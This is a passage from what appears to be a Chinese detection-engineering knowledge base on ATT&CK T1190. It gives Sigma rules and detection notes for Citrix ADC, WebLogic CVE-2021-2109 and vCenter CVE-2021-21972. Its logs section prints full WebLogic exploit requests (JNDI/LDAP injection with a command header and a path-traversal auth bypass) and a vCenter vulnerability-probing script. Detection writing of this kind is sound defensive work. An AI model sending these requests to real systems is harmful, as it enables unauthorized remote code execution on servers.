 - https://www.cnblogs.com/potatsoSec/p/13281577.html\n    - https://research.nccgroup.com/2020/07/10/rift-citrix-adc-vulnerabilities-cve-2020-8193-cve-2020-8195-and-cve-2020-8196-intelligence/\nstatus: experimental\ndate: 2020/07/10\ntags:\n    - attack.initial_access\n    - attack.t1190\nlogsource:\n    category: webserver\ndetection:\n    selection1:\n        c-uri|contains: \n            - '/rapi/filedownload?filter=path:%2F' #\u5220\u9664\u6587\u4ef6\u65f6POST\u8bf7\u6c42\uff0cURL\u8def\u5f84\u5305\u542b\u7684\u5b57\u6bb5\u3002\n    selection2:\n        c-uri|contains|all:\n            - '/pcidss/report' #\u83b7\u53d6\u6240\u6709\u9ed8\u8ba4\u7b7e\u540d\u65f6POST\u8bf7\u6c42URL\u5185\u5305\u542b\u7684\u5b57\u6bb5\n            - 'type=all_signatures'\n            - 'sig_name=_default_signature_'\n    condition: 1 of them\nfields:\n    - client_ip\n    - vhost\n    - url\n    - response\nfalsepositives:\n    - Unknown\nlevel: critical\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#_8","title":"\u5efa\u8bae","text":"<p>\u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\uff0c\u7814\u5224\u653b\u51fb\u662f\u5426\u6210\u529f\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1190</p> <p>https://attack.mitre.org/techniques/T1190/</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"T1190-CVE-2021-2109_Weblogic_LDAP_\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002</p> <p>\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002</p> <p>\u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>2021\u5e741\u670820\u65e5\uff0c\u7eff\u76df\u79d1\u6280\u76d1\u6d4b\u53d1\u73b0Oracle\u5b98\u65b9\u53d1\u5e03\u4e862021\u5e741\u6708\u5173\u952e\u8865\u4e01\u66f4\u65b0\u516c\u544aCPU\uff08Critical Patch Update\uff09\uff0c\u5171\u4fee\u590d\u4e86329\u4e2a\u4e0d\u540c\u7a0b\u5ea6\u7684\u6f0f\u6d1e\uff0c\u5176\u4e2d\u5305\u62ec7\u4e2a\u5f71\u54cdWebLogic\u7684\u4e25\u91cd\u6f0f\u6d1e\uff08CVE-2021-1994\u3001CVE-2021-2047\u3001CVE-2021-2064\u3001CVE-2021-2108\u3001CVE-2021-2075\u3001CVE-2019-17195\u3001CVE-2020-14756\uff09\uff0c\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u6b64\u6b21\u7684\u6f0f\u6d1e\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002CVSS\u8bc4\u5206\u5747\u4e3a9.8\uff0c\u5229\u7528\u590d\u6742\u5ea6\u4f4e\u3002\u5efa\u8bae\u7528\u6237\u5c3d\u5feb\u91c7\u53d6\u63aa\u65bd\uff0c\u5bf9\u4e0a\u8ff0\u6f0f\u6d1e\u8fdb\u884c\u9632\u62a4\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#0x1","title":"0x1 \u5f71\u54cd\u7248\u672c","text":"<pre><code>WebLogic Server 10.3.6.0.0\n\nWebLogic Server 12.1.3.0.0\n\nWebLogic Server 12.2.1.3.0\n\nWebLogic Server 12.2.1.4.0\n\nWebLogic Server 14.1.1.0.0\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#0x2","title":"0x2 \u6f0f\u6d1e\u8be6\u60c5","text":"<p>\u53ef\u53c2\u8003\uff1a</p> <p>Weblogic LDAP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2021-210\uff1ahttps://blog.csdn.net/m0_46257936/article/details/112984836</p> <p>\u3010\u6f0f\u6d1e\u590d\u73b0\u7cfb\u5217\u3011\u8d85\u8be6\u7ec6\u590d\u73b0\u8fc7\u7a0b_CVE-2021-2109_Weblogic Server\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0_JDK\u7248\u672c\u5bf9\u6bd4\uff1ahttps://www.cnblogs.com/huaflwr/p/14317388.html</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>HTTP.log\uff0c\u4e3b\u8981\u662f\u57fa\u4e8ePOC\u62a5\u6587\u8fdb\u884c\u68c0\u6d4b\uff0cPOC\u5982\u4e0b\uff1a</p> <pre><code>POST /console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.122;1:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1\nHost: 192.168.122.9:7001\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\ncmd:whoami\nCookie:  ADMINCONSOLESESSION=8xUkHS93pNBdw9iRlb1XOoH5Iy5qm65NmKad54eCEtDI2PErEIXy!-181493417\nConnection: close\n\n\n\u914d\u5408\u672a\u6388\u6743\u8bbf\u95ee\u540e\u53f0\n\nPOST /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.122;1:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1\nHost: 192.168.122.9:7001\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\ncmd:pwd\nCookie:  ADMINCONSOLESESSION=8xUkHS93pNBdw9iRlb1XOoH5Iy5qm65NmKad54eCEtDI2PErEIXy!-181493417\nConnection: close\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u53ef\u53c2\u8003\u6f0f\u6d1e\u8be6\u60c5\u90e8\u5206</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_4","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: Oracle WebLogic CVE-2021-2109 HTTP\u534f\u8bae\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b\nstatus: \u6d4b\u8bd5\u72b6\u6001\ndescription: \u57fa\u4e8eHTTP\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b\nreferences:\n    - https://blog.csdn.net/m0_46257936/article/details/112984836\n    - https://www.cnblogs.com/Yang34/archive/2004/01/13/14327495.html\nlogsource:\n    category: webserver #\u65e5\u5fd7\u6e90\uff1awebserver\ndetection:\n    selection:\n        cs-method: 'GET' #\u8bf7\u6c42\u65b9\u6cd5\u4e3aGET\n        c-uri|contains|all: #\u8bf7\u6c42url\u4e2d\u5305\u542b\u4ee5\u4e0b\u4efb\u610f\u5185\u5bb9\n            - 'com.bea.console.handles.JndiBindingHandle'\n            - 'ldap://'\n            - 'AdminServer'\n    condition: selection\nfields: \n    - c-ip\n    - c-dns\nfalsepositives: #\u8bef\u62a5\u60c5\u51b5 \u672a\u77e5\n    - Unknown\nlevel: critical\ntags:\n    - attack.t1190\n    - attack.initial_access\n    - cve.2021-2109\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_5","title":"\u5efa\u8bae","text":"<p>\u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907(\u5929\u773c)\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_6","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1190</p> <p>https://attack.mitre.org/techniques/T1190/</p> <p>Weblogic LDAP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2021-2109</p> <p>https://blog.csdn.net/m0_46257936/article/details/112984836</p> <p>\u3010\u6f0f\u6d1e\u590d\u73b0\u7cfb\u5217\u3011\u8d85\u8be6\u7ec6\u590d\u73b0\u8fc7\u7a0b_CVE-2021-2109_Weblogic Server\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0_JDK\u7248\u672c\u5bf9\u6bd4</p> <p>https://www.cnblogs.com/huaflwr/p/14317388.html</p> <p>CVE-2021-2109 Weblogic Server\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c</p> <p>https://www.cnblogs.com/Yang34/archive/2004/01/13/14327495.html</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/","title":"T1190-CVE-2021-21972 Vmware vcenter\u672a\u6388\u6743\u4efb\u610f\u6587\u4ef6/RCE\u6f0f\u6d1e","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002</p> <p>\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002</p> <p>\u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>2021\u5e7402\u670824\u65e5\uff0c\u67d0\u4e9b\u5e73\u53f0\u76d1\u6d4b\u5230 Vmware\u5b98\u65b9\u53d1\u5e03\u4e86vCenter Server\u5b89\u5168\u66f4\u65b0\uff0c\u4fee\u590d\u4e86vSphereClient (HTML5)\u5728vCenter Server\u63d2\u4ef6vRealizeOperations\uff08vROps\uff09\u4e2d\u7684\u4e00\u4e2a\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE-2021-21972\uff09\u3002VMware \u00a0vCenter Server\u662f\u7f8e\u56fd\u5a01\u777f\uff08VMware\uff09\u516c\u53f8\u7684\u4e00\u5957\u670d\u52a1\u5668\u548c\u865a\u62df\u5316\u7ba1\u7406\u8f6f\u4ef6\u3002\u8be5\u8f6f\u4ef6\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7528\u4e8e\u7ba1\u7406VMware vCenter\u73af\u5883\u7684\u96c6\u4e2d\u5f0f\u5e73\u53f0\uff0c\u53ef\u81ea\u52a8\u5b9e\u65bd\u548c\u4ea4\u4ed8\u865a\u62df\u57fa\u7840\u67b6\u6784\u3002\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u8bbf\u95eeweb\u7ba1\u7406\u7aef\u5411vCenter Server\u53d1\u9001\u8bf7\u6c42\u4ece\u800c\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u6267\u884c\u4efb\u610f\u547d\u4ee4\u6216\u8005\u4e0a\u4f20\u4e00\u4e2awebshell\u5230vcenter\u670d\u52a1\u5668\u7684\u4efb\u610f\u4f4d\u7f6e\u6267\u884c</p> <p>\u5177\u6709\u7f51\u7edc\u8bbf\u95ee\u7aef\u53e3443\u7684\u6076\u610f\u884c\u4e3a\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u6b64\u95ee\u9898\u5728\u6258\u7ba1vCenter Server\u7684\u57fa\u7840\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u4ee5\u4e0d\u53d7\u9650\u5236\u7684\u7279\u6743\u6267\u884c\u547d\u4ee4\u3002\u8fd9\u4f1a\u5f71\u54cdVMware vCenter Server\uff087.0 U1c\u4e4b\u524d\u76847.x\uff0c6.7 U3l\u4e4b\u524d\u76846.7\u548c6.5 U3n\u4e4b\u524d\u76846.5\uff09\u548cVMware Cloud Foundation\uff084.2.3\u4e4b\u524d\u76844.x\u548c3.10.1.2\u4e4b\u524d\u76843.x\uff09\u3002</p> <p>\u6b64\u5916\uff0cVMware\u8fd8\u4fee\u590d\u4e86VMware ESXi\u4e2d\u4e00\u4e2a\u91cd\u8981\u7684\u5806\u6ea2\u51fa\u6f0f\u6d1e\uff08CVE-2021-21974\uff09\u4e0eVMware vSphere\u4e2d\u7684\u4e00\u4e2aSSRF\u6f0f\u6d1e\uff08CVE-2021-21973\uff09\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/#0x1","title":"0x1 \u5f71\u54cd\u7248\u672c","text":"<pre><code>VMware vCenter Server 7.0\u7cfb\u5217 &lt; 7.0.U1c\n\nVMware vCenter Server 6.7\u7cfb\u5217 &lt; 6.7.U3l\n\nVMware vCenter Server 6.5\u7cfb\u5217 &lt; 6.5 U3n\n\nVMware ESXi 7.0\u7cfb\u5217 &lt; ESXi70U1c-17325551\n\nVMware ESXi 6.7\u7cfb\u5217 &lt; ESXi670-202102401-SG\n\nVMware ESXi 6.5\u7cfb\u5217 &lt; ESXi650-202102101-SG\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/#0x2","title":"0x2 \u6f0f\u6d1e\u8be6\u60c5","text":"<p>\u53ef\u53c2\u8003\uff1a</p> <p>CVE-2021-21972 Vmware vcenter\u672a\u6388\u6743\u4efb\u610f\u6587\u4ef6/RCE\u6f0f\u6d1e\uff1ahttps://blog.csdn.net/weixin_43650289/article/details/114055417</p> <p>CVE-2021-21972 vCenter \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5206\u6790\uff1ahttps://cert.360.cn/report/detail?id=62aac9b181bcfcb2b5faf33c6907a3dc</p> <p>CVE-2021-21972-vCenter-6.5-7.0-RCE-POC\uff1ahttps://github.com/QmF0c3UK/CVE-2021-21972-vCenter-6.5-7.0-RCE-POC/blob/main/CVE-2021-21972.py</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>HTTP.log\uff0c\u4e3b\u8981\u662f\u57fa\u4e8ePOC\u62a5\u6587\u8fdb\u884c\u68c0\u6d4b\uff0cPOC\u5982\u4e0b\uff1a</p> <pre><code>import requests\nfrom requests.packages import urllib3\nurllib3.disable_warnings()\nimport argparse\nimport os\ndef url():\n  parser = argparse.ArgumentParser(description='vCenter 6.5-7.0 RCE \u6f0f\u6d1e\u590d\u73b0(CVE-2021-21972)POC')\n  parser.add_argument('target_url',type=str,help='The target address,example: https://192.168.140.153:4445')\n  args = parser.parse_args() \n  global url\n  url = args.target_url\n  if url.startswith('http://') or url.startswith('https://'):\n   pass\n  else:\n   print('[-]Please include http:// or https:// in the URL!!')\n   os._exit(0)\n  if url.endswith('/'):\n   url = url[:-1]\n  print('[+]author:chenchen')\n  print(\"[-]\u76ee\u6807\u5730\u5740:\",url)\n  print(\"[-]\u6b63\u5728\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b...\")\n  return url\ndef poc():\n headers={\n  'User-Agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36',\n  \"Content-Type\":\"application/x-www-form-urlencoded\"\n }\n url_v = url + '/ui/vropspluginui/rest/services/updateova'\n try:\n  code = requests.get(url=url_v,headers=headers,timeout=4,verify=False).status_code\n  print('status_code:',code)\n  if code == 405:\n   print('[+]\u6f0f\u6d1e\u5b58\u5728')\n  else:\n   print('[-]\u6f0f\u6d1e\u4e0d\u5b58\u5728')\n except:\n  print('[-]\u53d1\u751f\u9519\u8bef')\nif __name__ == '__main__':\n url()\n poc()\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u53ef\u53c2\u8003\u6f0f\u6d1e\u8be6\u60c5\u90e8\u5206</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/#_4","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: CVE-2021-21972 Vmware vcenter\u672a\u6388\u6743\u4efb\u610f\u6587\u4ef6/RCE\u6f0f\u6d1e\nstatus: \u6d4b\u8bd5\u72b6\u6001\ndescription: \u57fa\u4e8eHTTP\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b\nreferences:\n    - https://cert.360.cn/report/detail?id=62aac9b181bcfcb2b5faf33c6907a3dc\n    - https://github.com/QmF0c3UK/CVE-2021-21972-vCenter-6.5-7.0-RCE-POC/blob/main/CVE-2021-21972.py\nlogsource:\n    category: webserver #http_log\ndetection:\n    selection:\n        cs-method: 'POST' #\u8bf7\u6c42\u65b9\u6cd5\u4e3apost\n        c-uri: #\u8bf7\u6c42url\u4e2d\u5305\u542b\u4ee5\u4e0b\u8def\u5f84\n            - '/ui/vropspluginui/rest/services/uploadova'\n    condition: selection\nfields: \n    - c-ip\n    - c-dns\nfalsepositives: \n    - OVA uploads to your VSphere appliance\nlevel: high\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/#_5","title":"\u5efa\u8bae","text":"<p>\u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907(\u5982\u5929\u773c\u7b49)\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/#_6","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1190</p> <p>https://attack.mitre.org/techniques/T1190/</p> <p>CVE-2021-21972 Vmware vcenter\u672a\u6388\u6743\u4efb\u610f\u6587\u4ef6/RCE\u6f0f\u6d1e</p> <p>https://blog.csdn.net/weixin_43650289/article/details/114055417</p> <p>CVE-2021-21972 vCenter\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5206\u6790</p> <p>https://cert.360.cn/report/detail?id=62aac9b181bcfcb2b5faf33c6907a3dc</p> <p>CVE-2021-21972-vCenter-6.5-7.0-RCE-POC</p> <p>https://github.com/QmF0c3UK/CVE-2021-21972-vCenter-6.5-7.0-RCE-POC/blob/main/CVE-2021-21972.py</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-JumpServer%20v2.6.1%20RCE%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B/","title":"T1190-JumpServer v2.6.1 